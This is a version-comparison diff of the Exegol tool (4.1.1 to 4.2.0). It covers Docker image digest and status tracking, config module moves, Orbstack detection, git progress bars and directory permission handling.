+        if self.__profile_digest:
+            self.__is_update = self.__profile_digest == self.__parseDigest(docker_image)
+        else:
+            self.__is_update = self.__digest == self.__parseDigest(docker_image)
+        # If this image is remote, set digest ID
+        self.__is_remote = not (len(self.__image.attrs["RepoDigests"]) == 0 and self.__checkLocalLabel())
+        if self.__is_remote:
+            self.__setDigest(self.__parseDigest(self.__image))
         # Add version tag (if available)
         for repo_tag in docker_image.attrs["RepoTags"]:
             tmp_name, tmp_tag = repo_tag.split(':')
             version_parsed = MetaImages.tagNameParsing(tmp_tag)
             if tmp_name == ConstantConfig.IMAGE_NAME and version_parsed:
                 self.__setImageVersion(version_parsed)
         # backup plan: Use label to retrieve image version
@@ -159,22 +179,29 @@
         dockerhub_data = meta.getDockerhubImageForArch(self.getArch())
         self.__is_remote = True
         if self.__version_specific:
             # Solve conflict for same name / tag but multiple arch
             self.__version_specific = not meta.is_latest
             self.__name = meta.name
             self.__outdated = self.__version_specific
+        elif not meta.version:
+            # nightly image don't have a version in their tag. The latest version must be fetch from label on the registry directly
+            fetch_version = WebUtils.getRemoteVersion(self.__name)
+            if fetch_version:
+                meta.version = fetch_version
         if dockerhub_data is not None:
             self.__dl_size = self.__processSize(dockerhub_data.get("size", 0))
         self.__setLatestVersion(meta.version)
+        if meta.meta_id:
+            self.__setLatestRemoteId(meta.meta_id)
+        # Check if local image is sync with remote digest id (check up-to-date status)
+        self.__is_update = self.__digest == self.__profile_digest
         if not self.__digest and meta.is_latest and meta.meta_id:
             # If the digest is lost (multiple same image installed locally) fallback to meta id (only if latest)
             self.__digest = meta.meta_id
-        # Check if local image is sync with remote digest id (check up-to-date status)
-        self.__is_update = self.__digest == meta.meta_id
         # Refresh status after metadata update
         self.syncStatus()
 
     def setAsDiscontinued(self):
         logger.debug(f"The image '{self.getName()}' (digest: {self.getRemoteId()}) has not been found remotely, "
                      f"considering it as discontinued.")
         # If there are still remote images but the image has not found any match it is because it has been deleted/discontinued
@@ -183,29 +210,30 @@
         self.__is_update = True
         # Status must be updated after changing previous criteria
         self.syncStatus()
 
     def __labelVersionParsing(self):
         """Fallback version parsing using image's label (if exist).
         This method can only be used if version has not been provided from the image's tag."""
-        if "N/A" in self.__image_version:
+        if "N/A" in self.__image_version and self.__image is not None:
             logger.debug("Try to retrieve image version from labels")
             version_label = self.__image.labels.get("org.exegol.version")
             if version_label is not None:
                 self.__setImageVersion(version_label, source_tag=False)
                 if self.isVersionSpecific():
                     self.__profile_version = self.__image_version
 
     @classmethod
     def parseAliasTagName(cls, image: Image) -> str:
         """Create a tag name alias from labels when image's tag is lost"""
         return image.labels.get("org.exegol.tag", "<none>") + "-" + image.labels.get("org.exegol.version", "v?")
 
     def __checkLocalLabel(self):
         """Check if the local label is set. Default to yes for old build"""
+        assert self.__image is not None
         return self.__image.labels.get("org.exegol.version", "local").lower() == "local"
 
     def syncStatus(self):
         """When the image is loaded from a docker object, docker repository metadata are not present.
         It's not (yet) possible to know if the current image is up-to-date."""
         if "N/A" in self.__profile_version and not self.isLocal() and not self.isUpToDate() and not self.__is_discontinued and not self.__outdated:
             self.__custom_status = "[bright_black]Unknown[/bright_black]"
@@ -224,33 +252,49 @@
                 self.__name = original_name
                 version_parsed = MetaImages.tagNameParsing(self.__name)
                 self.__version_specific = bool(version_parsed)
                 self.__setImageVersion(version_parsed)
             self.__alt_name = f'{original_name} [orange3](outdated' \
                               f'{f" v.{self.getImageVersion()}" if "N/A" not in self.getImageVersion() else ""})[/orange3]'
 
-    def autoLoad(self) -> 'ExegolImage':
+    def autoLoad(self, from_cache: bool = True) -> 'ExegolImage':
         """If the current image is in an unknown state, it's possible to load remote data specifically."""
         if "Unknown" in self.__custom_status and \
                 not self.isVersionSpecific() and \
                 "N/A" in self.__profile_version and \
                 not ParametersManager().offline_mode:
             logger.debug(f"Auto-load remote version for the specific image '{self.__name}'")
             # Find remote metadata for the specific current image
-            with console.status(f"Synchronization of the [green]{self.__name}[/green] image status...", spinner_style="blue"):
-                remote_digest = WebUtils.getMetaDigestId(self.__name)
-                version = WebUtils.getRemoteVersion(self.__name)
-            if remote_digest is not None and self.__digest:
-                # Compare current and remote latest digest for up-to-date status
-                self.__is_update = self.__digest == remote_digest
+            with console.status(f"Synchronization of the [green]{self.__name}[/green] image status...",
+                                spinner_style="blue"):
+                remote_digest = None
+                version = None
+                if from_cache:
+                    cache_images = DataCache().get_images_data()
+                    # Cache can be directly use for 3 days after this delay a direct call must be made to check for update. Use info action to update the cache.
+                    if not cache_images.metadata.is_outdated(days=3):
+                        for img in cache_images.data:
+                            if img.name == self.__name:
+                                version = img.last_version
+                                remote_digest = img.digest
+                                break
+                if not from_cache or version is None:
+                    remote_digest = WebUtils.getMetaDigestId(self.__name)
+                    version = WebUtils.getRemoteVersion(self.__name)
+            if remote_digest is not None:
+                self.__setLatestRemoteId(remote_digest)
+                if self.__digest:
+                    # Compare current and remote latest digest for up-to-date status
+                    self.__is_update = self.__digest == self.__profile_digest
             if version is not None:
-                # Fallback to version matching
-                self.__is_update = self.__is_update or self.__image_version == version
                 # Set latest remote version
                 self.__setLatestVersion(version)
+                if remote_digest is None:
+                    # Fallback to version matching
+                    self.__is_update = self.__is_update or self.__image_version == version
             self.__custom_status = ""
         return self
 
     def updateCheck(self) -> Optional[str]:
         """If this image can be updated, return its name, otherwise return None"""
         if self.__is_remote:
             if self.__is_update:
@@ -431,15 +475,18 @@
         else:
             logger.error(f"Error, {type(other)} compare to ExegolImage is not implemented")
             raise NotImplementedError
 
     def __str__(self):
         """Default object text formatter, debug only"""
         return f"{self.__name} ({self.__image_version}/{self.__profile_version} {self.__arch}) - {self.__disk_size} - " + \
-               (f"({self.getStatus()}, {self.__dl_size})" if self.__is_remote else f"{self.getStatus()}")
+            (f"({self.getStatus()}, {self.__dl_size})" if self.__is_remote else f"{self.getStatus()}")
+
+    def __repr__(self):
+        return str(self)
 
     def setCustomStatus(self, status: str):
         """Manual image's status overwrite"""
         self.__custom_status = status
 
     def getStatus(self, include_version: bool = True) -> str:
         """Formatted text getter of image's status.
@@ -487,14 +534,22 @@
                 return digest_id.split('@')[1]
         return ""
 
     def getRemoteId(self) -> str:
         """Remote digest getter"""
         return self.__digest
 
+    def __setLatestRemoteId(self, digest: str):
+        """Remote latest digest getter"""
+        self.__profile_digest = digest
+
+    def getLatestRemoteId(self) -> str:
+        """Remote latest digest getter"""
+        return self.__profile_digest
+
     def __setImageId(self, image_id: Optional[str]):
         """Local image id setter"""
         if image_id is not None:
             self.__image_id = image_id.split(":")[1][:12]
 
     def getLocalId(self) -> str:
         """Local id getter"""
@@ -614,12 +669,13 @@
     def getFullVersionName(self) -> str:
         """Dockerhub image's full (installed) version name getter"""
         return f"{ConstantConfig.IMAGE_NAME}:{self.getInstalledVersionName()}"
 
     def getDockerRef(self) -> str:
         """Find and return the right id to target the current image for docker.
         If tag is lost, fallback to local image id."""
+        assert self.__image is not None
         if self.getFullName() in self.__image.attrs.get('RepoTags', []):
             return self.getFullName()
         elif self.getFullVersionName() in self.__image.attrs.get('RepoTags', []):
             return self.getFullVersionName()
         return self.getLocalId()
```

### Comparing `Exegol-4.1.1/exegol/model/ExegolModules.py` & `Exegol-4.2.0/exegol/model/ExegolModules.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,18 +1,18 @@
 from pathlib import Path
 from typing import Optional, Union
 
 from exegol.console.ExegolPrompt import Confirm
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.exceptions.ExegolExceptions import CancelOperation
-from exegol.utils.ConstantConfig import ConstantConfig
+from exegol.config.ConstantConfig import ConstantConfig
 from exegol.utils.ExeLog import logger
 from exegol.utils.GitUtils import GitUtils
 from exegol.utils.MetaSingleton import MetaSingleton
-from exegol.utils.UserConfig import UserConfig
+from exegol.config.UserConfig import UserConfig
 
 
 class ExegolModules(metaclass=MetaSingleton):
     """Singleton class dedicated to the centralized management of the project modules"""
 
     def __init__(self):
         """Init project git modules to None until their first call"""
@@ -72,14 +72,15 @@
                     self.__git_resources = None
                     self.getResourcesGit()
                 else:
                     # Error during install, raise error to avoid update process
                     raise CancelOperation
             else:
                 self.__warningExcludeFolderAV(UserConfig().exegol_resources_path)
+                assert self.__git_resources is not None
                 if not self.__git_resources.clone(ConstantConfig.EXEGOL_RESOURCES_REPO):
                     # Error during install, raise error to avoid update process
                     raise CancelOperation
         else:
             # User cancel installation, skip update update
             raise CancelOperation
```

### Comparing `Exegol-4.1.1/exegol/model/MetaImages.py` & `Exegol-4.2.0/exegol/model/MetaImages.py`

 * *Files 1% similar despite different names*

```diff
@@ -91,7 +91,10 @@
         return result
 
     def setVersionSpecific(self, meta_version: 'MetaImages'):
         self.version = meta_version.version
 
     def __str__(self):
         return f"{self.name} ({self.version}) [{self.meta_id}] {self.list_arch}"
+
+    def __repr__(self):
+        return self.__str__()
```

### Comparing `Exegol-4.1.1/exegol/utils/ConstantConfig.py` & `Exegol-4.2.0/exegol/config/ConstantConfig.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import site
 from pathlib import Path
 
 
 class ConstantConfig:
     """Constant parameters information"""
     # Exegol Version
-    version: str = "4.1.1"
+    version: str = "4.2.0"
 
     # Exegol documentation link
     documentation: str = "https://exegol.rtfd.io/"
     discord: str = "https://discord.gg/cXThyp7D6P"
     # OS Dir full root path of exegol project
     src_root_path_obj: Path = Path(__file__).parent.parent.parent.resolve()
     # Path of the Dockerfile
```

### Comparing `Exegol-4.1.1/exegol/utils/DockerUtils.py` & `Exegol-4.2.0/exegol/utils/DockerUtils.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,25 +5,26 @@
 import docker
 from docker import DockerClient
 from docker.errors import APIError, DockerException, NotFound, ImageNotFound
 from docker.models.images import Image
 from docker.models.volumes import Volume
 from requests import ReadTimeout
 
+from exegol.config.DataCache import DataCache
 from exegol.console.TUI import ExegolTUI
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.exceptions.ExegolExceptions import ObjectNotFound
 from exegol.model.ExegolContainer import ExegolContainer
 from exegol.model.ExegolContainerTemplate import ExegolContainerTemplate
 from exegol.model.ExegolImage import ExegolImage
 from exegol.model.MetaImages import MetaImages
-from exegol.utils.ConstantConfig import ConstantConfig
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.ConstantConfig import ConstantConfig
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, console, ExeLog
-from exegol.utils.UserConfig import UserConfig
+from exegol.config.UserConfig import UserConfig
 from exegol.utils.WebUtils import WebUtils
 
 
 # SDK Documentation : https://docker-py.readthedocs.io/en/stable/index.html
 
 
 class DockerUtils:
@@ -101,15 +102,15 @@
         logger.debug(f"Entrypoint: {entrypoint}")
         logger.debug(f"Cmd: {command}")
         try:
             container = cls.__client.containers.run(model.image.getDockerRef(),
                                                     entrypoint=entrypoint,
                                                     command=command,
                                                     detach=True,
-                                                    name=model.hostname,
+                                                    name=model.container_name,
                                                     hostname=model.hostname,
                                                     extra_hosts={model.hostname: '127.0.0.1'},
                                                     devices=model.config.getDevices(),
                                                     environment=model.config.getEnvs(),
                                                     labels=model.config.getLabels(),
                                                     network_mode=model.config.getNetworkMode(),
                                                     ports=model.config.getPorts(),
@@ -215,14 +216,17 @@
         """List available docker images.
         Return a list of ExegolImage"""
         if cls.__images is None:
             remote_images = cls.__listRemoteImages()
             local_images = cls.__listLocalImages()
             cls.__images = ExegolImage.mergeImages(remote_images, local_images)
         result = cls.__images
+        assert result is not None
+        # Caching latest images
+        DataCache().update_image_cache([img for img in result if not img.isVersionSpecific()])
         if not (logger.isEnabledFor(ExeLog.VERBOSE) or include_locked):
             # ToBeRemoved images are only shown in verbose mode
             result = [i for i in result if not i.isLocked()]
         if not include_version_tag:
             # Version specific images not installed are excluded by default
             result = [img for img in result if not img.isVersionSpecific() or img.isInstall()]
         return result
@@ -389,17 +393,18 @@
         return remote_results
 
     @classmethod
     def __findImageMatch(cls, remote_image: ExegolImage):
         """From a Remote ExegolImage, try to find a local match (using Remote DigestID).
         This method is useful if the image repository name is also lost"""
         try:
-            docker_image = cls.__client.images.get(f"{ConstantConfig.IMAGE_NAME}@{remote_image.getRemoteId()}")
+            docker_image = cls.__client.images.get(f"{ConstantConfig.IMAGE_NAME}@{remote_image.getLatestRemoteId()}")
         except ImageNotFound:
             raise ObjectNotFound
+        remote_image.resetDockerImage()
         remote_image.setDockerObject(docker_image)
 
     @classmethod
     def downloadImage(cls, image: ExegolImage, install_mode: bool = False) -> bool:
         """Download/pull an ExegolImage"""
         if ParametersManager().offline_mode:
             logger.critical("It's not possible to download a docker image in offline mode ...")
@@ -453,26 +458,26 @@
             else:
                 logger.debug(f"Error: {err}")
                 return f"en unknown error occurred while downloading this image : {err.explanation}"
 
     @classmethod
     def removeImage(cls, image: ExegolImage, upgrade_mode: bool = False) -> bool:
         """Remove an ExegolImage from disk"""
-        logger.verbose(f"Removing {'previous ' if upgrade_mode else ''}image [green]{image.getName()}[/green]...")
         tag = image.removeCheck()
         if tag is None:  # Skip removal if image is not installed locally.
             return False
         try:
             with console.status(f"Removing {'previous ' if upgrade_mode else ''}image [green]{image.getName()}[/green]...", spinner_style="blue"):
                 if not image.isVersionSpecific() and image.getInstalledVersionName() != image.getName() and not upgrade_mode:
                     # Docker can't remove multiple images at the same tag, version specific tag must be remove first
                     logger.debug(f"Removing image {image.getFullVersionName()}")
                     cls.__client.images.remove(image.getFullVersionName(), force=False, noprune=False)
                 logger.debug(f"Removing image {image.getLocalId()} ({image.getFullVersionName() if upgrade_mode else image.getFullName()})")
                 cls.__client.images.remove(image.getLocalId(), force=False, noprune=False)
+            logger.verbose(f"Removing {'previous ' if upgrade_mode else ''}image [green]{image.getName()}[/green]...")
             logger.success(f"{'Previous d' if upgrade_mode else 'D'}ocker image successfully removed.")
             return True
         except APIError as err:
             # Handle docker API error code
             logger.verbose(err.explanation)
             if err.status_code == 409:
                 if upgrade_mode:
```

### Comparing `Exegol-4.1.1/exegol/utils/EnvInfo.py` & `Exegol-4.2.0/exegol/config/EnvInfo.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import json
 import platform
 import re
 import shutil
 import subprocess
 from typing import Optional, Any, List
 
-from exegol.utils.ConstantConfig import ConstantConfig
+from exegol.config.ConstantConfig import ConstantConfig
 from exegol.utils.ExeLog import logger
 
 
 class EnvInfo:
     """Class to identify the environment in which exegol runs to adapt
     the configurations, processes and messages for the user"""
 
@@ -17,18 +17,19 @@
         """Dictionary class for static OS Name"""
         WINDOWS = "Windows"
         LINUX = "Linux"
         MAC = "Mac"
 
     class DockerEngine:
         """Dictionary class for static Docker engine name"""
-        WLS2 = "wsl2"
-        HYPERV = "hyper-v"
-        MAC = "mac"
-        LINUX = "kernel"
+        WLS2 = "WSL2"
+        HYPERV = "Hyper-V"
+        MAC = "Docker desktop"
+        ORBSTACK = "Orbstack"
+        LINUX = "Kernel"
 
     """Contain information about the environment (host, OS, platform, etc)"""
     # Shell env
     current_platform: str = "WSL" if "microsoft" in platform.release() else platform.system()  # Can be 'Windows', 'Linux' or 'WSL'
     is_linux_shell: bool = current_platform in ["WSL", "Linux"]
     is_windows_shell: bool = current_platform == "Windows"
     is_mac_shell = not is_windows_shell and not is_linux_shell  # If not Linux nor Windows, its (probably) a mac
@@ -72,25 +73,30 @@
         """Initialize information from Docker daemon data"""
         # Fetch data from Docker daemon
         docker_os = docker_info.get("OperatingSystem", "unknown").lower()
         docker_kernel = docker_info.get("KernelVersion", "unknown").lower()
         # Deduct a Windows Host from data
         cls.__is_docker_desktop = docker_os == "docker desktop"
         is_host_windows = cls.__is_docker_desktop and "microsoft" in docker_kernel
+        is_orbstack = "(containerized)" in docker_os and "orbstack" in docker_kernel
         if is_host_windows:
             # Check docker engine with Windows host
             if "wsl2" in docker_kernel:
                 cls.__docker_engine = cls.DockerEngine.WLS2
             else:
                 cls.__docker_engine = cls.DockerEngine.HYPERV
             cls.__docker_host_os = cls.HostOs.WINDOWS
         elif cls.__is_docker_desktop:
             # If docker desktop is detected but not a Windows engine/kernel, it's (probably) a mac
             cls.__docker_engine = cls.DockerEngine.MAC
             cls.__docker_host_os = cls.HostOs.MAC
+        elif is_orbstack:
+            # Orbstack is only available on Mac
+            cls.__docker_engine = cls.DockerEngine.ORBSTACK
+            cls.__docker_host_os = cls.HostOs.MAC
         else:
             # Every other case it's a linux distro and docker is powered from the kernel
             cls.__docker_engine = cls.DockerEngine.LINUX
             cls.__docker_host_os = cls.HostOs.LINUX
 
     @classmethod
     def getHostOs(cls) -> str:
@@ -139,14 +145,19 @@
 
     @classmethod
     def isDockerDesktop(cls) -> bool:
         """Return true if docker desktop is used on the host"""
         return cls.__is_docker_desktop
 
     @classmethod
+    def isOrbstack(cls) -> bool:
+        """Return true if docker desktop is used on the host"""
+        return cls.__docker_engine == cls.DockerEngine.ORBSTACK
+
+    @classmethod
     def getDockerEngine(cls) -> str:
         """Return Docker engine type.
         Can be 'kernel', 'mac', 'wsl2' or 'hyper-v'"""
         # initData must be called from DockerUtils on client initialisation
         assert cls.__docker_engine is not None
         return cls.__docker_engine
```

### Comparing `Exegol-4.1.1/exegol/utils/ExeLog.py` & `Exegol-4.2.0/exegol/utils/ExeLog.py`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol/utils/FsUtils.py` & `Exegol-4.2.0/exegol/utils/FsUtils.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import logging
 import re
 import stat
 import subprocess
 from pathlib import Path, PurePosixPath, PurePath
 from typing import Optional
 
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger
 
 
 def parseDockerVolumePath(source: str) -> PurePath:
     """Parse docker volume path to find the corresponding host path."""
     # Check if path is from Windows Docker Desktop
     matches = re.match(r"^/run/desktop/mnt/host/([a-z])(/.*)$", source, re.IGNORECASE)
@@ -56,30 +56,30 @@
 def setGidPermission(root_folder: Path):
     """Set the setgid permission bit to every recursive directory"""
     logger.verbose(f"Updating the permissions of {root_folder} (and sub-folders) to allow file sharing between the container and the host user")
     logger.debug(f"Adding setgid permission recursively on directories from {root_folder}")
     perm_alert = False
     # Set permission to root directory
     try:
-        root_folder.chmod(root_folder.stat().st_mode | stat.S_ISGID)
+        root_folder.chmod(root_folder.stat().st_mode | stat.S_IRWXG | stat.S_ISGID)
     except PermissionError:
         # Trigger the error only if the permission is not already set
         if not root_folder.stat().st_mode & stat.S_ISGID:
             logger.warning(f"The permission of this directory ({root_folder}) cannot be automatically changed.")
             perm_alert = True
     for sub_item in root_folder.rglob('*'):
         # Find every subdirectory
         if not sub_item.is_dir():
             continue
         # If the permission is already set, skip
         if sub_item.stat().st_mode & stat.S_ISGID:
             continue
         # Set the permission (g+s) to every child directory
         try:
-            sub_item.chmod(sub_item.stat().st_mode | stat.S_ISGID)
+            sub_item.chmod(sub_item.stat().st_mode | stat.S_IRWXG | stat.S_ISGID)
         except PermissionError:
             logger.warning(f"The permission of this directory ({sub_item}) cannot be automatically changed.")
             perm_alert = True
     if perm_alert:
         logger.warning(f"In order to share files between your host and exegol (without changing the permission), you can run [orange3]manually[/orange3] this command from your [red]host[/red]:")
         logger.empty_line()
         logger.raw(f"sudo chgrp -R $(id -g) {root_folder} && sudo find {root_folder} -type d -exec chmod g+rws {{}} \;", level=logging.WARNING)
```

### Comparing `Exegol-4.1.1/exegol/utils/GitUtils.py` & `Exegol-4.2.0/exegol/utils/GitUtils.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,16 +1,19 @@
 import os
+import sys
 from pathlib import Path
 from typing import Optional, List
 
-from git.exc import GitCommandError
+from git.exc import GitCommandError, RepositoryDirtyError
+from rich.progress import TextColumn, BarColumn
 
+from exegol.config.ConstantConfig import ConstantConfig
+from exegol.config.EnvInfo import EnvInfo
+from exegol.console.MetaGitProgress import MetaGitProgress, clone_update_progress, SubmoduleUpdateProgress
 from exegol.console.cli.ParametersManager import ParametersManager
-from exegol.utils.ConstantConfig import ConstantConfig
-from exegol.utils.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, console
 
 
 # SDK Documentation : https://gitpython.readthedocs.io/en/stable/index.html
 
 class GitUtils:
     """Utility class between exegol and the Git SDK"""
@@ -34,14 +37,17 @@
         try:
             test_git_dir = self.__repo_path / '.git'
             if test_git_dir.is_file():
                 logger.debug("Git submodule repository detected")
                 self.__is_submodule = True
             elif not test_git_dir.is_dir():
                 raise ReferenceError
+            elif sys.platform == "win32":
+                # Skip next platform specific code (temp fix for mypy static code analysis)
+                pass
             elif not EnvInfo.is_windows_shell and test_git_dir.lstat().st_uid != os.getuid():
                 raise PermissionError(test_git_dir.owner())
         except ReferenceError:
             if self.__git_name == "wrapper":
                 logger.warning("Exegol has [red]not[/red] been installed via git clone. Skipping wrapper auto-update operation.")
                 if ConstantConfig.pip_installed:
                     logger.info("If you have installed Exegol with pip, check for an update with the command "
@@ -106,19 +112,25 @@
         except ImportError:
             logger.error(f"Unable to find git on your machine. The {self.getName()} repository cannot be cloned.")
             logger.warning("Please install git to support this feature.")
             return False
         custom_options = []
         if optimize_disk_space:
             custom_options.append('--depth=1')
-        # TODO add progress bar via TUI
         from git import GitCommandError
         try:
-            with console.status(f"Downloading {self.getName()} git repository", spinner_style="blue"):
-                self.__gitRepo = Repo.clone_from(repo_url, str(self.__repo_path), multi_options=custom_options)
+            with MetaGitProgress(TextColumn("{task.description}", justify="left"),
+                                 BarColumn(bar_width=None),
+                                 "•",
+                                 "[progress.percentage]{task.percentage:>3.1f}%",
+                                 "[bold]{task.completed}/{task.total}[/bold]") as progress:
+                progress.add_task(f"[bold red]Cloning {self.getName()} git repository", start=True)
+                self.__gitRepo = Repo.clone_from(repo_url, str(self.__repo_path), multi_options=custom_options, progress=clone_update_progress)
+                progress.remove_task(progress.tasks[0].id)
+            logger.success(f"The {self.getName()} git repository have been successfully clone!")
         except GitCommandError as e:
             # GitPython user \n only
             error = GitUtils.formatStderr(e.stderr)
             logger.error(f"Unable to clone the git repository. {error}")
             return False
         self.__init_repo()
         return True
@@ -174,27 +186,21 @@
             branch = self.getCurrentBranch()
             if branch is None:
                 logger.warning("No branch is currently attached to the git repository. The up-to-date status cannot be checked.")
                 return False
         assert self.__gitRepo is not None
         assert self.__gitRemote is not None
         # Get last local commit
-        current_commit = self.__gitRepo.heads[branch].commit
+        current_commit = self.get_current_commit()
         # Get last remote commit
-        try:
-            fetch_result = self.__gitRemote.fetch()
-        except GitCommandError:
-            logger.warning("Unable to fetch information from remote git repository, do you have internet ?")
-            return True
-        try:
-            self.__fetchBranchInfo = fetch_result[f'{self.__gitRemote}/{branch}']
-        except IndexError:
-            logger.warning("The selected branch is local and cannot be updated.")
+        if not self.__fetch_update(branch):
             return True
 
+        assert self.__fetchBranchInfo is not None
+
         logger.debug(f"Fetch flags : {self.__fetchBranchInfo.flags}")
         logger.debug(f"Fetch note : {self.__fetchBranchInfo.note}")
         logger.debug(f"Fetch old commit : {self.__fetchBranchInfo.old_commit}")
         logger.debug(f"Fetch remote path : {self.__fetchBranchInfo.remote_ref_path}")
         from git import FetchInfo
         # Bit check to detect flags info
         if self.__fetchBranchInfo.flags & FetchInfo.HEAD_UPTODATE != 0:
@@ -206,18 +212,55 @@
         if self.__fetchBranchInfo.flags & FetchInfo.FORCED_UPDATE != 0:
             logger.debug("FORCED_UPDATE flag detected")
         if self.__fetchBranchInfo.flags & FetchInfo.REJECTED != 0:
             logger.debug("REJECTED flag detected")
         if self.__fetchBranchInfo.flags & FetchInfo.NEW_TAG != 0:
             logger.debug("NEW TAG flag detected")
 
-        remote_commit = self.__fetchBranchInfo.commit
+        remote_commit = self.get_latest_commit()
         # Check if remote_commit is an ancestor of the last local commit (check if there is local commit ahead)
         return self.__gitRepo.is_ancestor(remote_commit, current_commit)
 
+    def __fetch_update(self, branch: Optional[str] = None) -> bool:
+        """Fetch latest update from remote"""
+        if self.__gitRemote is None:
+            return False
+        try:
+            fetch_result = self.__gitRemote.fetch()
+        except GitCommandError:
+            logger.warning("Unable to fetch information from remote git repository, do you have internet ?")
+            return False
+        if branch is None:
+            branch = self.getCurrentBranch()
+        try:
+            self.__fetchBranchInfo = fetch_result[f'{self.__gitRemote}/{branch}']
+        except IndexError:
+            logger.warning("The selected branch is local and cannot be updated.")
+            return False
+        return True
+
+    def get_current_commit(self):
+        """Fetch current commit id on the current branch."""
+        assert self.isAvailable
+        assert self.__gitRepo is not None
+        branch = self.getCurrentBranch()
+        if branch is None:
+            branch = "master"
+        # Get last local commit
+        return self.__gitRepo.heads[branch].commit
+
+    def get_latest_commit(self):
+        """Fetch latest remote commit id on the current branch."""
+        assert self.isAvailable
+        assert not ParametersManager().offline_mode
+        if self.__fetchBranchInfo is None:
+            self.__fetch_update()
+        assert self.__fetchBranchInfo is not None
+        return self.__fetchBranchInfo.commit
+
     def update(self) -> bool:
         """Update local git repository within current branch"""
         assert self.isAvailable
         assert not ParametersManager().offline_mode
         if not self.safeCheck():
             return False
         # Check if the git branch status is not detached
@@ -240,39 +283,45 @@
             logger.error("It's not possible to update any submodule in offline mode ...")
             return
         logger.verbose(f"Git {self.getName()} init submodules")
         # These modules are init / updated manually
         blacklist_heavy_modules = ["exegol-resources"]
         # Submodules dont have depth submodule limits
         depth_limit = not self.__is_submodule
+        if self.__gitRepo is None:
+            return
         with console.status(f"Initialization of git submodules", spinner_style="blue") as s:
             try:
                 submodules = self.__gitRepo.iter_submodules()
             except ValueError:
                 logger.error(f"Unable to find any git submodule from '{self.getName()}' repository. Check the path in the file {self.__repo_path / '.git'}")
                 return
             for current_sub in submodules:
                 # Submodule update are skipped if blacklisted or if the depth limit is set
                 if current_sub.name in blacklist_heavy_modules or \
                         (depth_limit and ('/' in current_sub.name or '\\' in current_sub.name)):
                     continue
                 s.update(status=f"Downloading git submodules [green]{current_sub.name}[/green]")
                 from git.exc import GitCommandError
                 try:
+                    # TODO add TUI with progress
                     current_sub.update(recursive=True)
                 except GitCommandError as e:
                     error = GitUtils.formatStderr(e.stderr)
                     logger.debug(f"Unable tu update git submodule {current_sub.name}: {e}")
                     if "unable to access" in error:
                         logger.error("You don't have internet to update git submodule. Skipping operation.")
                     else:
                         logger.error("Unable to update git submodule. Skipping operation.")
                         logger.error(error)
                 except ValueError:
                     logger.error(f"Unable to update git submodule '{current_sub.name}'. Check the path in the file '{Path(current_sub.path) / '.git'}'")
+                except RepositoryDirtyError as e:
+                    logger.debug(e)
+                    logger.error(f"Sub-repository {current_sub.name} have uncommitted local changes. Unable to automatically update this repository.")
 
     def submoduleSourceUpdate(self, name: str) -> bool:
         """Update source code from the 'name' git submodule"""
         assert not ParametersManager().offline_mode
         if not self.isAvailable:
             return False
         assert self.__gitRepo is not None
@@ -281,17 +330,22 @@
         except ValueError:
             logger.debug(f"Git submodule '{name}' not found.")
             return False
         from git.exc import RepositoryDirtyError
         try:
             from git.exc import GitCommandError
             try:
-                # TODO add TUI progress
-                with console.status(f"Downloading submodule [green]{name}[/green]", spinner_style="blue"):
-                    submodule.update(to_latest_revision=True)
+                with MetaGitProgress(TextColumn("{task.description}", justify="left"),
+                                     BarColumn(bar_width=None),
+                                     "•",
+                                     "[progress.percentage]{task.percentage:>3.1f}%",
+                                     "[bold]{task.completed}/{task.total}[/bold]") as progress:
+                    progress.add_task(f"[bold red]Downloading submodule [green]{name}[/green]", start=True)
+                    submodule.update(to_latest_revision=True, progress=SubmoduleUpdateProgress())
+                    progress.remove_task(progress.tasks[0].id)
             except GitCommandError as e:
                 logger.debug(f"Unable tu update git submodule {name}: {e}")
                 if "unable to access" in e.stderr:
                     logger.error("You don't have internet to update git submodule. Skipping operation.")
                 else:
                     logger.error("Unable to update git submodule. Skipping operation.")
                     logger.error(e.stderr)
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `Exegol-4.1.1/exegol/utils/GuiUtils.py` & `Exegol-4.2.0/exegol/utils/GuiUtils.py`

 * *Files 5% similar despite different names*

```diff
@@ -4,23 +4,24 @@
 import subprocess
 import time
 from pathlib import Path
 from typing import Optional
 
 from exegol.console.ExegolPrompt import Confirm
 from exegol.exceptions.ExegolExceptions import CancelOperation
-from exegol.utils.EnvInfo import EnvInfo
+from exegol.config.EnvInfo import EnvInfo
 from exegol.utils.ExeLog import logger, console
 
 
 class GuiUtils:
     """This utility class allows determining if the current system supports the GUI
     from the information of the system."""
 
     __distro_name = ""
+    default_x11_path = "/tmp/.X11-unix"
 
     @classmethod
     def isGuiAvailable(cls) -> bool:
         """
         Check if the host OS can support GUI application with X11 sharing
         :return: bool
         """
@@ -29,15 +30,15 @@
             return cls.__windowsGuiChecks()
         elif EnvInfo.isMacHost():
             return cls.__macGuiChecks()
         # Linux default is True
         return True
 
     @classmethod
-    def getX11SocketPath(cls) -> str:
+    def getX11SocketPath(cls) -> Optional[str]:
         """
         Get the host path of the X11 socket
         :return:
         """
         if cls.__distro_name:
             # Distro name can only be set if the current host OS is Windows
             return f"\\\\wsl.localhost\\{cls.__distro_name}\\mnt\\wslg\\.X11-unix"
@@ -46,26 +47,35 @@
                 # Mount point from a WSL shell context
                 return f"/mnt/wslg/.X11-unix"
             else:
                 # From a Windows context, a WSL distro should have been supply during GUI checks
                 logger.debug(f"No WSL distro have been previously found: '{cls.__distro_name}'")
                 raise CancelOperation("Exegol tried to create a container with GUI support on a Windows host "
                                       "without having performed the availability tests before.")
+        elif EnvInfo.isMacHost():
+            # Docker desktop don't support UNIX socket through volume, we are using XQuartz over the network until then
+            return None
         # Other distributions (Linux / Mac) have the default socket path
-        return "/tmp/.X11-unix"
